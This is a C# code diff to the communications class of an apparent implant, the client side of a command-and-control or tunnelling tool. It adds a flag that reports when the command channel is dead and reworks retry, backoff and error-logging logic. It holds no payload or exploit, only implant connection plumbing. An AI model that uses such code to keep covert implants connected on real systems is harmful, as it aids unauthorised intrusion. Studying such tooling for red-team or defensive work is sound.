@@ -30,14 +30,16 @@ namespace ImplantSide.Classes.Comms
             _error = error;
         }
 
-        public List<byte> Send(String sessionPayload, List<byte> payload)
+        public List<byte> Send(String sessionPayload, List<byte> payload, out bool commandChannelDead)
         {
-            return Send(sessionPayload, "nochange", payload);
+            return Send(sessionPayload, "nochange", payload, out commandChannelDead);
         }
 
-        public List<byte> Send(String sessionPayload, String status, List<byte> payload)
+        public List<byte> Send(String sessionPayload, String status, List<byte> payload, out bool commandChannelDead)
         {
-            if (String.IsNullOrWhiteSpace(status))
+			commandChannelDead = false;
+
+			if (String.IsNullOrWhiteSpace(status))
                 status = "nochange";
 
             var sessionAndStatus = sessionPayload + ":" + status;
@@ -85,7 +87,6 @@ namespace ImplantSide.Classes.Comms
             UInt16 retryCount = 0;
             Guid errorId = Guid.NewGuid();
             //This is only if the command channel has failed first time
-            bool errorQuestionAsked = false;
             do
             {
                 try
@@ -137,57 +138,54 @@ namespace ImplantSide.Classes.Comms
                         else
                         {
                             _error.FailError($"Kept trying but afraid error isn't going away {retryInterval} {ex.Message} {ex.Status.ToString()} {_config.CommandServerUI.ToString()} {errorId.ToString()}");
-                        }
+							commandChannelDead = true;
+							return null;
+						}
                     }
                     else if (sessionPayload == _config.CommandChannelSessionId)
                     {
-                        retryRequired = true;
-
-                        _error.LogError("Command Channel failed to connect" + ((errorQuestionAsked) ? ": retry interval " + retryInterval + "ms" : ""));
-                        if (InitialConnectionSucceded.HasValue && !InitialConnectionSucceded.Value)
+                        if (!RetryUntilFailure(ref retryCount, ref retryRequired, ref retryInterval))
                         {
-                            if (!RetryUntilFailure(ref retryCount, ref retryRequired, ref retryInterval))
-                            {
-                                lst.Add("Command channel re-tried connection 5 times giving up");
-                                ReportErrorWebException(ex, lst, errorId);
-                            }
-                        }
+                            lst.Add("Command channel re-tried connection 5 times giving up");
+                            ReportErrorWebException(ex, lst, errorId);
+							commandChannelDead = true;
+							return null;
+						}
+						retryRequired = true;
                     }
                     else
                     {
-                        //ReportErrorWebException(ex, lst, errorId);
+                        ReportErrorWebException(ex, lst, errorId);
                         if (HttpStatusCode.NotFound == ((HttpWebResponse)ex.Response).StatusCode)
                         {
                             if (_error.VerboseErrors)
-                            _error.LogError(String.Format($"Connection on server has been killed"));
+								_error.LogError(String.Format($"Connection on server has been killed"));
                         }
                         else
                             _error.LogError(String.Format($"Send to {_config.URL} failed with {ex.Message}"));
-                        retryRequired = false;
-                        return null;
+						return null;
                     }                       
                 }
             } while (retryRequired);
 
             if (!InitialConnectionSucceded.HasValue)
-                InitialConnectionSucceded = false;
+			{
+				commandChannelDead = true;
+				InitialConnectionSucceded = false;
+			}
+                
             return null;
         }
 
         bool RetryUntilFailure(ref UInt16 retryCount, ref bool retryRequired, ref Int32 retryInterval)
         {
             if (5 <= retryCount++)
-            {
-                retryRequired = false;
-            }
-            else
-            {
-                if (retryCount > 2)
-                    retryInterval += retryInterval;
-                
-                Timeout.WaitOne(retryInterval);
-            }
-            return true;
+				return retryRequired = false;
+            
+			_error.LogError($"Command Channel failed to connect : retry interval {retryInterval} ms");
+			Timeout.WaitOne(retryInterval);
+			retryInterval += retryInterval;
+			return true;
         }
 
         Uri BuildServerURI(String payload = null)
@@ -210,7 +208,7 @@ namespace ImplantSide.Classes.Comms
             lst.Add(ex.Status.ToString());
             lst.Add(_config.CommandServerUI.ToString());
             lst.Add(errorId.ToString());
-            _error.FailError(lst);
+            _error.LogError(lst);
         }
     }
 }
